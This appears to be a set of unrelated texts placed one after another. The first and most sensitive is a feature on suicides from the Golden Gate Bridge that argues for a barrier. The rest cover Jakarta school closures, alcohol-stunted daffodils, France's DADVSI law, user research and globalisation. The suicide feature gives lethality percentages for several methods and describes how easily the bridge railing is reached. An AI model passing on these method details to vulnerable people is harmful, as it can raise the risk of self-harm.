Jose Maldonado , associate professor of psychiatry and behavioral sciences at Stanford , says suicide " is one of those things people do n't talk about , especially when it has to do with matters of pride , especially with people in your own family .
That can be extrapolated to society at large .
People in San Francisco do n't want to talk about suicide in their own city . "
Denial is powerful .
San Franciscans joke about bridge suicides in the offhand way we poke fun at a losing ball team or a scandal - tinged public official .
The suicides themselves are vaguely perceived .
In the '90s , a suicide club was formed to predict the exact date that the 1,000th suicide would jump to his or her death .
As the death toll approached , a local disc jockey promised a case of Snapple to the victim 's family .
In June 1995 , trying to stem the countdown fever , the California Highway Patrol halted its official count at 997 .
In early July , Eric Atkinson , 20 , became the unofficial thousandth .
His body was never found after witnesses saw him jump .
Richard Seiden , a suicidologist and professor emeritus of behavioral science at UC Berkeley , remembers a greeting card he found in a gift shop .
On the outside was a pen-and - ink drawing of the bridge .
On the inside , this sentiment : " Do n't jump to conclusions ! "
In 1978 Seiden published a study of 515 people who were prevented from jumping off the bridge .
He found that only 6 percent went on to kill themselves .
Seiden , now retired , has written of the bridge 's " mystical allure " for suicides -- its combination of beauty , lethality , romance and efficiency .
That allure , complex and ultimately mysterious , can be broken down into five factors .
ACCESSIBILITY
For Eve Meyer , executive director of San Francisco Suicide Prevention and a passionate advocate for a suicide barrier , accessibility is the biggest factor in making the bridge a magnet for death .
" It 's something you can accomplish relatively easily , " she says , " and that 's what makes it so dangerous . "
The railing is 4 feet high , and the parking lot is a short distance from the bridge .
Within two to five minutes of parking one 's car or getting off a bus , one can dive over the railing .
No need to buy a gun or to stash pills ; none of the bother of hanging or asphyxiation .
Says Meyer , " It 's almost like saying , ' If you 're a failure , you can always do this . ' "
In his original plans , chief engineer Joseph Strauss considered the bridge 's potential as a suicide site and designed railings 5 1/2 feet high .
On May 7 , 1936 , a year before the opening of the bridge , Strauss boasted to the San Francisco Call - Bulletin that the bridge was " practically suicide - proof . "
" The guard rails , " he was quoted as saying , " are five feet and six inches high and are so constructed that any persons on the pedestrian walk could not get a handhold to climb over them .
The intricate telephone and patrol systems will operate so efficiently that anyone acting suspiciously would be immediately surrounded .
Suicide from the bridge is neither possible nor probable . "
By the time the bridge opened a year later , Strauss ' promise had evaporated .
It 's unclear when the plans were modified , but at some point architect Irving Morrow , originally hired to design the entryways and bridge plazas , went to work on the guardrails .
Morrow reduced them to 4 feet , and in doing so created a stage for decades of self - slaughter .
Today , after seven failed campaigns to pressure the Golden Gate Bridge , Highway and Transportation District into building a suicide barrier , the bridge remains a nearly foolproof method for suicide .
One of this year 's fatalities , Lois Anne Houston , was 75 and overweight , but even for her the 4 - foot rail was no deterrent .
" Some people already have the Golden Gate Bridge in their mind , in the same way others have a gun in the closet , " says Kay Redfield Jamison , professor of psychiatry at Johns Hopkins University School of Medicine and author of a noted book on the psychology of suicide , " Night Falls Fast : Understanding Suicide . "
" The particular place or means of suicide is obviously highly idiosyncratic , but it 's a function of what 's available . "
FINALITY
Suicides have a special language .
Like carpenters they want to know which tools .
They never ask why build .
-- from the Anne Sexton poem " Wanting to Die "
Marissa Imrie was a straight - A student at Santa Rosa High School when she jumped off the bridge in December 2001 .
After her death , Marissa 's mother , Renee Milligan , looked on her computer and found that Marissa had researched a Web site on suicide .
She also had bought a book , Geo Stone 's " Suicide and Attempted Suicide : Methods and Consequences , " and learned that a jump from the bridge is far deadlier than suicide methods typically favored by women and girls : Poison is 15 percent effective ; drug overdose , 12 percent ; wrist cutting , 5 percent .
On Amazon.com , a customer review describes Stone 's book as " a cookbook .
But instead of teaching you how to make a souffle or Peking Duck , it has recipes for death . "
Poison , drugs and wrist slashing are all potentially fatal , but in each case there 's a window of time in which victims are open to second thoughts .
With death imminent , their lives might seem more valuable or the cost of their death to family and friends too high .
So they call 911 , a friend or a relative .
With a leap from the bridge , second thoughts are useless .
Although some suicides and suicide attempts are carried out with ambivalence -- they 're a cry for help , a desperate plea for acknowledgment -- there are those who want only to die .
In such cases , the belief that one method of suicide is especially deadly can bring comfort .
" The amount of pain and suffering that leads up to suicide is very hard for people to grasp who have n't been very profoundly depressed , " says Jamison , who once made a suicide attempt and later described it in her 1995 book , " An Unquiet Mind : A Memoir of Moods and Madness . "
" It 's just so incredibly painful .
People are really desperate .
And one aspect of that desperation is really wanting to die and have a very final way . "
THE WERTHER EFFECT
In January 1933 , two classmates from a Tokyo school jumped into Mount Mihara , an active volcano on the Japanese island of Oshima .
Weeks later , six more leaped into the volcano .
Soon tourists were gathering to witness the suicides , which totaled 140 that year , 160 the next .
Barriers were erected ; it 's no longer a suicide destination .
" Various places develop a reputation as suicide landmarks , " says suicidologist Seiden .
" Hanging trees and lovers ' leaps and places like the Golden Gate Bridge start to get a notoriety .
They develop a self - propelling momentum . "
In 1974 , sociologist David Phillips gave a new name to suicide contagion .
He called it the Werther effect , taking the name from " The Sorrows of Young Werther , " an 18th century German novel by Johann Wolfgang von Goethe .
The story of a young man 's suicide by pistol after a failed romance , " Sorrows " inspired a rash of copycat suicides -- many of whom dressed for death in the style of the novel 's tragic hero -- until the book was banned in several countries .
Newspaper and media accounts are believed to contribute to the Werther effect , which is why The Chronicle stopped reporting each Golden Gate Bridge suicide more than 20 years ago .
The Centers for Disease Control and Prevention and the American Association of Suicidology issued guidelines urging the media to downplay the suicides .
Marin County Coroner Ken Holmes said he went to the local media when the number approached 850 .
" We weaned them , " Holmes told the New Yorker magazine .
But , he added , " the lack of publicity has n't reduced the number of suicides at all . "
The Eiffel Tower in Paris , the Empire State Building in New York , the Arroyo Seco Bridge in Pasadena and the Bloor Street Viaduct in Toronto were notorious suicide magnets until barriers were erected .
Tellingly , when a suicide barrier was appended to the Bloor Street Viaduct -- after 480 deaths in 85 years -- people did n't drift to another bridge and create a new suicide magnet .
" When suicide becomes difficult , " Meyer says , " people do not switch to another method .
They tend to get help .
This is what happened in England when the formula for gas ovens was changed " -- carbon - monoxide levels were reduced -- " and it became harder for people to purchase certain over - the - counter drugs .
The suicide rate went down .
England has a suicide rate half the size of ours because they 're so aggressive about it . "
GRANDEUR
Mark Finch , 33 , was a tall , high - strung Englishman living in San Francisco .
Stylish , gifted and chronically depressed , he was in the process of coming off the antidepressant Effexor when he jumped off the Golden Gate Bridge on Jan. 14 , 1995 .
When he died , having left his leather briefcase on the bridge 's pedestrian walkway and a number of suicide notes on his office desk , his friends were stunned .
Jenni Olson , his co-director at the San Francisco International Lesbian & Gay Film Festival , recently made a film , " The Joy of Life , " that deals in part with Finch 's suicide and the bridge 's long legacy of death .
Why the bridge and not another form of suicide ?
" Of course , given his personality , I just thought , ' Oh , how Mark ' that it would be so spectacular .
He does n't do anything in a small way , " Olson said .
She sent copies of her film to the bridge 's board of directors , and believes it influenced the members ' decision in March to explore the possibility of a suicide barrier .
" The Joy of Life , " which played at the Castro Theatre in June , was shot on a 16 mm film stock that renders colors in rich , saturated tones and provides physical evidence of the bridge 's grandeur .
Filmed from below to emphasize its massive bulk and from a distance to capture its elegant Art Deco design and spectacular natural setting , the bridge looks iconic -- staggeringly beautiful .
It 's difficult to imagine another man-made structure so perfectly conformed to a setting of exquisite natural beauty .
" There is a kind of form to it , a certain grace and beauty , " a suicide survivor once told David Rose , a psychiatrist at UCSF Medical School .
" There 's something aesthetically pleasing about it , " said S.I. Hayakawa , the onetime president of San Francisco State who became a U.S. senator in 1976 .
Alfred Hitchcock capitalized on the bridge 's allure -- and dramatically enriched its mythology -- when he staged a powerful scene in his 1958 thriller , " Vertigo , " nearby .
Kim Novak , playing the mysterious Madeleine , drops rose petals into the bay at Fort Point -- under the shadow of the giant bridge .
Suddenly she jumps in and , in a sweeping gesture of movie - star heroism , Jimmy Stewart dives into the turbulent water and carries out the soaking Novak in his arms .
When glamour and beauty are required for a death site , the Golden Gate Bridge can't be topped .
For those who select it for suicide , says Jamison , there 's an attraction in " seeing for the last time something that is truly beautiful .
Perhaps doing it in a very beautiful , spectacular , dramatic way adds meaning to something that otherwise does n't have as much meaning as one would like . "
The beauty factor is perplexing , Jamison says , because most suicides occur in ordinary places : garages , attics , subway or train platforms .
" They 're not anything associated in any way with beauty .
To me it 's quite unusual in suicide literature .
Of course , it 's a very small percentage of suicides that jump from the bridge .
But there is a quality to it that is very haunting . "
JOINING THE HERD
Suicide is taboo in most world cultures -- perceived as a sin and affront to God , a callous rebuke to one 's family , the ultimate in ingratitude .
In America , suicide is often disdained , just like the depression that triggers it , as a lack of moral fiber .
" People think depression is like having lung cancer , " says Stanford 's Jose Maldonado . " ' You did it to yourself .
If you were n't so weak , you 'd pull yourself up by your bootstraps . ' "
In 1959 , a Chronicle story on the " enigma " of bridge suicides quoted East Bay psychiatrist Malcolm A. Sowers : " When someone jumps from that bridge , he is , in a way , joining all those who went before .
And that 's important , I believe , because even in suicide , people do n't like to be too far removed from the herd . "
Seiden of UC Berkeley dismisses that notion .
" Most of the people who are suicidal are so wound up in themselves , so depressed and so unable to see beyond the tip of their nose that the idea of becoming part of this larger congregation would n't really appeal to them .
They 're really stuck in one place , sort of glued into the fact that there 's no hope for them , no future , no alternatives .
They get a kind of tunnel vision . "
Perhaps the bridge 's necrology of suicide is tied to the city 's tradition of tolerance and nonjudgment , if not connected , as well , to the notion of San Francisco as a city of transplants , people who migrate from other parts of the country to find comfort and acceptance .
Once the seeker reaches land 's end , the gateway to the Pacific , does he find what Jack Kerouac called the city 's " end of continent sadness " ?
Finding that San Francisco is like any place -- short on miracles , incapable of erasing the past -- does he give up , believing he 's used his last option ?
There are no simple answers .
Jenni Olson conjectures that suicides choose the Golden Gate Bridge in part to spare their friends and family the horror of discovering their bodies .
By jumping off the bridge , and leaving the dirty work to the Coast Guard rescuers and coroners , Olson said , a suicide removes one major aspect of trauma for the survivors .
Whatever the elements that impel a person to jump off the bridge , it 's important to remember that every suicide is marked by irrationality .
" Suicide is a closed world , with its own irresistible logic , " wrote critic and novelist A. Alvarez in " The Savage God , " a response to the suicide of a friend , poet Sylvia Plath .
" Everything makes sense and follows its own strict rules ; yet , at the same time , everything is also different , perverted , upside down . "
The majority of suicides , Jamison wrote in " Night Falls Fast , " are people suffering from major depression , bipolar disorder or schizophrenia .
Often they 've gone off their medication ; in many cases drugs and alcohol exacerbate their disorders .
Divorce , reversal of fortune , disease or other crises can precipitate suicide , but these conditions are rarely unaccompanied by underlying mental disorders .
Immediate circumstances can inflame the suicidal mind , Alvarez writes , but " they are like a trivial border incident which triggers off a major war .
The real motives which impel a man to take his own life are elsewhere ; they belong to the internal world , devious , contradictory , labyrinthine , and mostly out of sight . "
In his landmark book on depression , " Darkness Visible , " William Styron described his illness as " a howling tempest in the brain , " " an unnameable tide that obliterated any enjoyable response to the living world . "
Plath , dead at 30 after sticking her head in a gas oven , described the quality of her despair as " owl 's talons clenching my heart . "
For a personality in crisis , the accessibility of the Golden Gate Bridge can be the tipping point between life and death .
" It 's like leaving a row of bottles of poison in front of a baby , " says Meyer of San Francisco Suicide Prevention .
" And they 're all pretty and have bows on them . "
The majority of bridge suicides are preventable , she says , because so many are impulsive .
Strangely , the greatest stumbling block in the building of a suicide barrier is the attitude of a population that prides itself on open - mindedness .
" I had someone come up to me as I was walking to some hearings and he said , ' They should put up a diving board so those people can jump off it . '
I said , ' Now say to me , " They should put up a diving board so my son could jump off of it . " ' "

6 International schools in Jakarta exclude teaching and learning activities inside the school .
The policy for holidays is the authority of the school as an effort to prevent the spread of the Corona COVID - 19 virus .
“ That the virus is spreading , so if it is suspected at the school that the potential is indeed medically it must be 14 days ( holiday ) with two days in control , ” said jokowi as president of Indonesian
Based on data from the Department of Education , international schools that are on holiday include ACG School , Mentari School , Cikal , Beacon Academy , Taipe School and JIS .
There are foreign teachers and students in international schools .
This makes the school worried about the spread of the Corona virus in their environment .

ITHACA , N.Y . --
Tippy tulips ?
Droopy daffodils ?
Try giving them a jigger of gin .
A Cornell University horticulturist has found that giving some potted plants diluted alcohol stunts the growth of leaves and stems but does n't bother the blossoms .
That 's a good thing , if you do n't want the flowers to get so tall they flop over .
You can use whiskey , vodka , gin or tequila -- or even plain ethanol if you happen to have it .
But wine and beer do n't work .
The booze has to be diluted with water to a concentration of four tosix percent alcohol .
William Miller , director of Cornell 's Flower Bulb Research Program , reported his findings in the April issue of Hort - Technology , a peer - reviewed journal .
Miller 's study focused on paperwhite narcissus and other daffodils but he 's also had promising results with tulips .
If you want to try it , add one part 80 - proof liquor to seven parts water .
Wait until daffodil shoots are several inches tall before applying the diluted booze .

This is a fantastic program !
Easy to use , plenty of options to tinker with , and fantastic results .
It even runs well on Linux with Wine ( I 'm using a Lenovo U260 with an Intel i5 processor and Linux Mint 11 to make that assessment ) .
There is only one bug that I can find -- the multiprocessor algorithm stops all sectors when one of the processors finishes its task , leaving the image with one computed sector and ( $number_of_processors - 1 ) incomplete sectors .
The single - processor algorithms , however , are quite satisfactory .

What is DADVSI ?
The DADVSI ( roughly " Author Rights and other Rights in the Information Society " ) is the French transcription of the European EUCD ( European Union Copyright Directive ) text , which itself is very similar to the American DMCA ( Digital Millenium Copyright Act ) .
The main goal of this law is to restrict the rights of digital content purchasers .
It most notably forbids them to work around technical content protection measures ( oh , by the way , it does not precisely describe was a technical content protection measure is , neither what is considered as working around ) .
Doing so , writing or publishing software allowing to do so , or even merely talking about ways to do so is illegal with this law .
On March 14th and 15th , this law was passed at the French " Assemblée Nationale " ( House of Representatives ) .
Despite the promises made by the French Ministry of Culture , this law does not protect Free Software , nor working around DRM for " legal " purposes .
Moreover , an amendment was adopted that punishes with 3 years in jail any person that would write , distribute or promote a software that is " obviously " aimed at illegal file sharing ( except if it is " only " aimed at legal sharing ) .
This amendment is nicknamed the Vivendi - Universal Amendment .
Guess why ...
VideoLAN is directly impacted , most notably for its DVD reading capability
This means that VLC will be considered as illegal in France as soon as this law is officially promulgated .
The penalty for distributing or promoting software that works around DRM is 6 months in jail and a 30 000 euros fine .
Here is a non-exhaustive list of free software that are impacted :
VLC ( reads DVD , works around iTunes DRM )
Mplayer ( reads DVD )
Totem ( reads DVD )
More generally , any free software DVD player
Bittorent ( P2P , could be used for illegal sharing )
e Mule and all its variants ( P2P , could be used for illegal sharing )
Sharpmusique ( works around iTunes DRM )
FairTunes ( works around iTunes DRM )
Any software that works around any DRM , either on music files or others

We also thank the MPs who have tried to raise attention on the dangers of this text and who have tried ( but failed ) to limit its nefarious effects .
Français , ceci vous concerne directement .
La loi DADVSI ( Droits d'Auteur et Droits Voisins dans la Société de l'Information ) est la transcription en droit français de la directive EUCD ( European Union Copyright Directive ) , qui est elle même inspirée du DMCA ( Digital Millenium Copyright Act ) américain .
L'effet principal de ce texte est de restreindre fortement les droits des particuliers achetant des produits culturels .
DADVSI s'oppose ainsi directement à l'exception de copie privée en autorisant les producteurs de contenu à mettre en place des mesures techniques ( DRM ) l'interdisant , et surtout en interdisant aux acquéreurs de contourner ces mesures .
( La loi ne définit toutefois pas précisément ni la notion de mesure technique de protection , ni la notion de contournement ) .
Contourner une mesure de protection , écrire ou diffuser un logiciel permettant de la contourner , ou faire connaître des moyens de le faire sont considérés comme illégaux dans le cadre de cette loi .
Les éléments principaux de cette loi ont été adoptés les 14 et 15 mars 2006 à l'Assemblée Nationale par une grande partie de la majorité UMP .
Malgré les promesses et les dénégations du Ministre de la Culture , M. Renaud Donnedieu de Vabres , cette loi ne protège en aucun cas le Logiciel Libre ni le contournement des DRM à des fins d'usage licite d'une oeuvre légalement acquise .
De plus , un amendement , surnommé Amendement Vivendi-Universal a été adopté .
Celui - ci punit de 3 ans de prison et 300 000 euros d'amende toute personne développant , distribuant , faisant la promotion , ou parlant d'un logiciel " manifestement " destiné au partage illicite de fichier ( à l'exception des logiciels uniquement destinés au partage légal ) .
Cette loi concerne directement VLC , notamment pour ses capacités à lire les DVD
Dès la promulgation de cette loi en France , VLC sera considéré comme illégal , et les développeurs et distributeurs passibles de 6 mois de prison et 30 000 euros d'amende .
Voici une liste non-exhaustive de logiciels libres touchés par ces mesures :
VLC ( lecture de DVD , contournement des DRM iTunes )
Mplayer ( lecture de DVD )
Totem ( lecture de DVD )
Plus généralement , tous les lecteurs de DVD libres
Bittorent ( logiciel de P2P , pouvant ê tre utilisé pour du partage illégal )
e Mule et toutes ses variantes ( logiciels de P2P , pouvant ê tre utilisés pour du partage illégal )
Sharpmusique ( contournement des DRM iTunes )
FairTunes ( contournement des DRM iTunes )
Tout logiciel qui contournerait les DRM , que ce soit sur des fichiers musicaux ou autres

Was ist DADVSI ?
Die DADVSI ( grob übersetzt " Autorenrechte und andere Rechte in der Informationsgesellschaft " ) ist die französische Umsetzung des europäischen EUCD - Textes ( European Union Copyright Directive ) , welcher dem amerikanischen DMCA ( Digital Millenium Copyright Act ) recht ähnlich ist .
Das Hauptziel dieses Gesetzes ist die Rechte der Käufer digitaler Inhalte einzuschränken .
Insbesondere verbietet es ihnen technische Schutzmechanismen zu umgehen .
( dabei weder definiert , was eine technische Kopierschutzmethode ist , noch was als Umgehung betrachtet wird )
Dies zu tun , Software zu entwickeln oder zu verffentlichen , die dies ermöglicht oder sogar nur über Möglichkeiten zu sprechen , wird mit diesem Gesetz illegal werden
VideoLAN ist davon direkt betroffen , insbesondere wegen der Fähigkeit , DVDs zu lesen .
Dies bedeutet , dass VLC in Frankreich als illegal angesehen werden wird , wenn das Gesetz offiziell verabschiedet ist .
Die Strafe für das Vertreiben oder Bewerben von Software , die DRM umgeht , wird 6 Monate im Gefängnis und eine Geldstrafe über 30.000 Euro betragen .
Hier eine unvollstndige Liste von betroffener freier Software :
VLC ( liest DVDs , umgeht das DRM von iTunes )
MPlayer ( liest DVDs )
Totem ( liest DVDs )

The Quantum Mechanics of Users
People have commented that " creating passionate users " means nothing more than " listening to users like we always have -- DUH ! "
But if it were that simple , we 'd all be producing -- and using -- products and services that people love .
That meet real needs .
That fulfill real desires .
That help people kick - ass .
How , then , to explain the Grand Canyon - sized gap between what users really want and what we so often produce as a direct result of our sincere listening ?
Maybe the physics is wrong ...
Light can behave as a wave , until you ask it to explain how it got from point A to point B , in which case it can behave as a particle .
In other words , asking light to explain itself can change the very nature of how we perceive it .
And this notion that sometimes " observing an event changes the event " comes up in many areas of quantum physics .
But it 's not just the subatomic world that gets weird when you look too closely -- in some cases , asking a user to explain his choices changes his choices !
In his book Blink , Malcolm Gladwell ( author of The Tipping Point ) gives an example where students were asked to rank order 44 different kinds of strawberry jams .
When compared with the rankings of experts , the students did fairly well -- " even those of us who are n't jam experts known good jam when we taste it . "
But -- and here 's where it gets weird -- when the students were asked in advance to provide not just the rankings but a written explanation of their choices , the student rankings lost virtually all correlation with that of the experts .
As Gladwell puts it , " By making people think about jam , [ the researchers ] turned them into jam idiots . "
Think about that when you 're asking for user feedback whether as focus groups , user questionnaires , or even usability testing ( although the implications are different for each of these things ) .
So how can we hope to learn anything about what our users want and need if the very act of answering a question could change their answer ?
We have to get better at making inferences from what we observe without intervention .
We have to get to the spirit of what we observe , rather than focusing on the specific details .
We have to reconize that what they do says much more than what they say , especially when they 're not saying anything at all .
Readers here left some great comments about this on my earlier Listening to users post :
Tim said :
The comments about listening to what the users are saying , what they 're not saying , and how it 's being said reminds me of the quote by Claude Debussy , " Music is the silence between the notes . "
And Matthew Moran said :
It is not that we should not listen to clients / users but we should not let their limited understanding of what is possible , limit where the solution / software / project can go .
It is important to listen and draw additional information into the open .
In this way , we can discover what is truly desired but never contemplated from the client 's perspective .
Paulo Eduardo
Neves said :
Gilberto Gil , a great brazilian musician and the country current minister of culture , has a verse that says : " The people knows what they want , but the people also wants what they do n't know " .
Eric Stephens offered this link great post from Mark Hurst on Customer Research that includes :
" In our non-directed listening labs , we ask customers to use the Internet in the way they normally use it at home or work .
While we do have a goal for the research , we try to let the customers lead us to the answer , rather than the other way around . "
And Stu Max made it simple :
I guess that 's how I 'd wish you would reframe your point :
You 've always got to listen to your users , but sometimes you 've got to listen beyond the words .
In addition to listening to users , we should observe them as a wildlife photographer or naturalist would -- in the users native habitat , from a distance , with as little intervention as possible .
We have to look for the whys based on the whats of their behavior .
And when we do ask questions , the questions should be not just on specific behaviors ( " why did you do it that way ? " ) but also ( perhaps more importantly ) about what they value at an abstract level ( " what does it mean to you to be using [ whatever ] in your [ work / life ] ?
How does it help you in ( or prevent you from ) kicking ass ? " )
This does n't mean we should n't sweat the details -- down to the last interface pixel , book font , metal finish , or drum beat .
It all matters .
And much of it can come from questioning users directly .
The trouble is that this is where we tend to spend nearly all of our " listen to users " effort .
We field complaints , solicit feedback , and accept customer requests .
In other words , we focus on the trees and miss the forest .
Why not become " user naturalists " and find out what really makes our users inspired / frustrated / motivated / hopeless / passionate ?
Maybe the best way to find out what they need and want from our product ( or from a future product we hope to develop ) is by asking about something other than the product .
Maybe they say they 're satisfied with our product ( or the category of products in which ours belongs ) , but we need to ask if they 're satisfied with the very nature of what they 're using our product for .
Maybe asking about their favorite hobbies -- the things they are passionate about -- can help shine a light toward a new feature or capability ( a new slider ) we had n't previously imagined .
One that nobody ever associated with this type of product or service .
While we can still ask why they chose the blue button , we must understand that if we tell them in advance that they 'll need to explain their choice , that knowledge could change the outcome .
It might cause them to click the blue button when they would have clicked the green one !
When you collapse the wave function , make sure that what you get is not simply what you caused by looking . : )

" Schrodinger 's Kittens " is a good book that deals with the waveform / particle duality of light and the wacky phenomenon of " the act of observation changes the outcome . "
It gets weirder than you think - if you dig this type of stuff Kathy check out " The Holographic Universe " too for another mind - blowing read .
You are right on with this analogy as it relates to querying users .
I do n't remember the strawberry jam example from Blink but the one he gave that really resonated with me was the experiment in which they asked college students to pick a poster they wanted for their dorm room .
Almost everyone opted for abstract art .
Then the experimenters conducted the same exercise only they asked the students to explain their choice .
The result was that nearly everyone ended up picking these lame posters with kittens and rainbows and crap - the kind of stuff you find in a doctor 's office .
Their justifications were responses like " because they 're cute and remind me of this time when blah blah " ( the theory is that they were subconsciously contriving those answers in realtime to apparently gain the approval of the experimenter ) .
And the true test then came with the satisfaction poll they conducted later that year ( because the students actually had to live with the poster they chose ) .
The ones that had to explain their choice ended up _hating_ their posters .
The minute you try to dissect a gut decision you 've thwarted the " thinslicing " from occurring and disarm your instinct .
Consistent with this research , using non-interfering usability studies would seem to promise the best means to get true feedback on software and web apps .
good stuff kathy .

I remember an exercise that swatch did when they first came out ; organising a display in a hotel foyer , then picking people off the street to ask which watch design they 'd choose if they were getting one that day .
The market researcher duly noted the persons choice .
On the way out , they were asked to " just take one watch off the other stand on the way out to keep as a thankyou for participating " .
Which all did .
The two stands were identical .
However , the watches chosen for the research and which were taken were completely different ...
I think it 's " Say 's law " that suggests you 'll never know the facts until you ship something .
Market research and people have a habit of not mixing too well !

Kathy ,
One reason I 'm so big on the use of personas , scenarios and storyboarding in Web design is that I see and feel something " missing " in the process of _only_ observing , asking , listening and thinking about what users do .
C.S. Lewis ( of Narnia fame ) wrote something very interesting in his essay , " Myth Became Fact " ( found in his collection , _God in the Dock_ .
Forgive the long quote because he says it so much better than I could :
" Human intellect is incurably abstract ...
Yet the only realities we experience are concrete -- this pain , this pleasure , this dog , this man .
While we are loving the man , bearing the pain , enjoying the pleasure , we are not intellectually apprehending Pleasure , Pain or Personality .
When we begin to do so , on the other hand , the concrete realities sink to the level of mere instances or examples : we are no longer dealing with them , but with that which they exemplify .
This is our dilemma -- either to taste and not to know or to know and not to taste -- or , more strictly , to lack one kind of knowledge because we are in an experience or to lack another kind because we are outside it .
As thinkers , we are cut off from what we think about ; as tasting , touching , willing , loving , hating , we do not clearly understand .
The more lucidly we think , the more we are cut off ; the more deeply we enter into reality , the less we can think .
You can not _study _
Pleasure in the moment of the nuptial embrace , nor repentance while repenting , nor analyse the nature of humour while roaring with laughter ...
" Of this tragic dilemma , myth is the partial solution .
In the enjoyment of a great myth , we come nearest to understanding as a concrete what can otherwise be understood only as an abstraction . "
Whew .
Well , I take this a bit further than Lewis .
Given that our minds are wired for story , I believe stories can be a bridge between knowledge and experience .
While watching , asking , listening to our users , we are removed from their experience .
Lewis might say we 're in the world of abstract thought and thus cannot fully understand what the user is experiencing .
My " partial solution " are personas , scenarios and stories based upon the findings of my user analysis .
I obsessively and dutifully gather all I can directly from users and let it stew in my mind .
At some point , imagination kicks in .
The abstract data begins to emerge in narratives that can take the form of personas , scenarios or stories about the user experience of the project I 'm working on .
As I work these stories out , they help me " enter into " the users ' experiences more fully than I could by producing a mere report or PowerPoint of my findings .
And stories are more powerful ways to communicate those findings to the project team .

A couple of these thoughts are echoed in agile programming - the idea of user stories , and the reality of getting * something * no matter how small , but which is of some use , into their hands - because that 's when what they REALLY want starts to come out , and also when what they did n't know they wanted is teased out .

Great points ( as always ) .
What you are describing is termed ethnography by anthropoligists .
Ethnography is a method of studying and learning about a person or group of people .
Typically , ethnography involves the study of a small group of subjects in their own environment .
Rather than looking at a small set of variables and a large number of subjects ( " the big picture " ) , the ethnographer attempts to get a detailed understanding of the circumstances of the few subjects being studied .
Ethnographic accounts , then , are both descriptive and interpretive ; descriptive , because detail is so crucial , and interpretive , because the ethnographer must determine the significance of what she observes without gathering broad , statistical information .
Clifford Geertz , whose thoughts about culture are excerpted in the Other Important Definitions of Culture , is famous for coining the term " thick description " in discussing the methodology of the ethnographer .
Definition above courtesy of Washington State University - Virtual Campus - Learning Commons glossary : http://www.wsu.edu:8001/vcwsu/commons/topics/culture/glossary/ethnography.html
I 'm finding that my anthropological knowlege is actually benefiting my IT carreer -- after all anthropology is the study of humans , and users are human .
It somtimes helps me to fill in the gap between what users say they want , and what they actually need to accomplish their goals .
Ric 's comment about " teasing out " what users did n't know they wanted is right on target .
To me , it 's analogous to unpicking embroidery - slow careful examination of the puzzle - but in reverse !

Amazing .
Not even a hint of the word ' empathy ' .
Is this really about creating passionate users ?
By observing them like some weird wildlife species ?
I thought we 've already made some progress in that field ( like , putting yourself in your user 's shoes ) .
But no , no mention of any empathy .
It 's a bleedin ' shame !

It is interesting to me that although we couch our verbiage in scientific analysis and the Graeco - Romans used allegorical language that many times the message is the same as it has been for centuries .
In the legend of Eros ( Cupid ) and Psyche - Everything is fine with Psyche 's marriage until she decides to examine her husband .
While Eros represents unthinking desire - Psyche represents objective analysis .
When Psyche attempts to use objective analysis to examine unthinking desire ( allegorically she lights an oil lamp to gaze upon her husband ) - unthinking desire is lost through examination .
As long as the students were asked which Strawberry Jam they prefered the answers they gave reflected their Desire without Analysis ( Eros ) but as soon as students were asked to apply Psyche ( objective analysis ) , Desire ( eros ) is lost .
Bulfinch 's rendering of the Psyche and Eros story is available at : http://www.bulfinch.org/fables/bull11.html

I do n't know how you continue to keep producing such super content .
This discussion reminded me of a brief set of guidelines my partner wrote for conducting surveys .
It boils down to asking people what they 've DONE vs asking them what they 'd do ?
It 's never the same thing .

I have to agree with Dave about the " superb content " .
The problem you describe , Kathy , relates to why it is so difficult for executives to appreciate the value of market research .
Since most people are themselves consumers , they think they are already experts on the market .
Since anyone can listen to customers , most people consider themselves qualified market researchers .
Yet listening to customers is not enough .
Asking questions is n't enough .
You have to ask the right questions in the right way .
Often the questions you ask are n't the questions you ultimately want answered ( see http://cauvin.blogspot.com/2005/08/framing-survey-questions.html).
And in some cases you 're better off with the ethnographic approach you mention , in which you observe without disturbing or asking any questions .
Posted by : Roger L. Cauvin | Dec 22 , 2005 3:38:25 PM
the thing is that no one really knows what want .
that takes way too much time and introspection to figure out .
so what people do is they look around and see what everyone else is doing and wanting and then use that instead because it feels like something they would want too .
basically desire is appropriated instead of created because its just too damn hard otherwise .
this is why there are some people who look deep into the structure and usability of things in order to come up with things to make life easier on the folks that have better things to do and cant be bothered .
a big problem comes when you look so deep that you forget that other people do not .
so the things that you might find valuable in the depths end up being extraneous to those on the surface because your point of view is skewed .
the hardest thing is to bring both of these perspectives together in a meaningful productive way .

The big yammer these days in the United States is to the effect that globalisation is here to stay : it 's wonderful , get used to it .
The chief cheerleader for this point of view is Thomas Friedman , columnist for the New York Times and author of The World Is Flat .
The seemingly unanimous embrace of this idea in the power circles of America is a marvellous illustration of the madness of crowds , for nothing could be further from the truth than the idea that globalisation is now a permanent fixture of the human condition .
Today 's transient global economic relations are a product of very special transient circumstances , namely relative world peace and absolutely reliable supplies of cheap energy .
Subtract either of these elements from the equation and you will see globalisation evaporate so quickly it will suck the air out of your lungs .
It is significant that none of the cheerleaders for globalisation takes this equation into account .
In fact , the American power elite is sleepwalking into a crisis so severe that the blowback may put both major political parties out of business .
The world saw an earlier phase of robust global trade run from the 1870s to a dead stop in 1914 .
This was the boom period of railroad construction and the advent of the ocean - going steamship .
The great powers had existed in relative peace since Napoleon 's last stand .
The Crimean war was a minor episode that took place in backwaters of Eurasia , and the Franco - Prussian war was a comic opera that lasted less than a year - most of it the static siege of Paris .
The American civil war hardly affected the rest of the world .
This first phase of globalisation then took off under coal - and - steam power .
There was no shortage of fuel , the colonial boundaries were stable , and the pipeline of raw materials from them to the factories of western Europe ran smoothly .
The rise of a middle class running the many stages of the production process provided markets for all the new production .
Innovations in finance gave legitimacy to all kinds of tradable paper .
Life was very good for Europe and America , notwithstanding a few sharp cyclical depressions and recoveries .
Trade boomed between the great powers .
The belle époque represented the high tide of hopeful expectations .
In America , it was called the progressive era .
The 20th century looked golden .
It all fell apart in 1914 .
Historians are still baffled about what really brought on the first world war .
What did France or Britain really care about Austrian archduke Franz Ferdinand , heir to the throne of a country already in deep eclipse ?
There were no active contests over territory at the time , not even in the Asian or African colonies .
And yet the diplomatic failures of that fateful summer led to the great slaughter of the trenches , the death of a substantial portion of the younger generation , and a virtual nervous breakdown of authority in politics and culture .
It would take a depression , fascism , and a second world war to resolve these issues and a new round of globalisation did not ramp up again until the mid-1960s .
